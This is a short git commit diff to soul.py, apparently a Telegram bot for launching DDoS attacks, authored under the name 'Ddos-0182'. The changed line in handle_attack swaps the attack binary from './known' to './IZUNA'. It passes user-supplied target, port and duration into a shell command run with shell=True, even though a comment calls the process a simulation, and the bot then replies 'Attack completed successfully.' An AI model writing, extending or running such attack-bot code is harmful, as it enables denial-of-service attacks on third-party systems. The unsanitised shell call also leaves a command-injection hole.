e9d3b3a069792105b9abae78afef27480101d55c
Ddos-0182 <telegrambot0001@outlook.com>
2025-02-10 07:42:31 +0530

    Update soul.py

--- soul.py
+++ soul.py
@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./known {target} {port} {time}"
+                    full_command = f"./IZUNA {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
